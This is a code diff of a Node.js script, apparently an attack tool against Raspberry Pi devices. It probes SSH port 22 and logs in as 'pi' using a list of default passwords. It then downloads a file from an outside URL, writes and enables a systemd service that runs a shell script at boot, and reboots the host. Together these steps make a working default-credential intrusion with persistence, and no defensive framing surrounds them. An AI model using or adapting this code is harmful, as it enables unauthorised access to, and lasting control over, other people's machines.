@@ -2,24 +2,37 @@ var tcPing = require('tcp-ping');
 var nodeSsh = require('node-ssh');
 const ssh = new nodeSsh();
 
+const passwords = [
+    "raspberry",
+    "password"
+]
+const ipAddress = "ip";
+
+
 const attemptConnect = async () => {
-    var live = await tcPing.probeAsync('192.168.1.42', 22);
+    var live = await tcPing.probeAsync(ipAddress, 22);
     if (live) {
-        const password = '';
+        const password = 'raspberry';
         console.log('port open', live)
-        ssh.connect({
-            host: '<hostname>',
-            port: 22,
-            username: 'pi',
-            password: password
-        }).then(() => {
-            ssh.execCommand('ls').then((status) => {
-                console.log(status);
-                ssh.dispose();
-            }).catch(() => {
-                ssh.dispose();
-            })
-        }).catch((err) => console.error(err));
+        try {
+            await ssh.connect({
+                host: ipAddress,
+                port: 22,
+                username: 'pi',
+                password: password
+            });
+            await ssh.execCommand('wget https://docs.ccsu.edu/Audit.pdf')
+            await ssh.execCommand('echo "[Unit]\nDescription=Echos Hello World\n\n[Service]\nType=simple\nExecStart=/home/pi/bat.sh\n\n[Install]\nWantedBy=multi-user.target" > test.service');
+            await ssh.execCommand('sudo mv test.service /etc/systemd/system');
+            await ssh.execCommand('sudo systemctl daemon-reload');
+            await ssh.execCommand('sudo systemctl enable test');
+            await ssh.execCommand('sudo reboot now');
+
+            ssh.dispose();
+        } catch (ex) {
+            ssh.dispose();
+            console.log(ex);
+        }
     }
 }
 
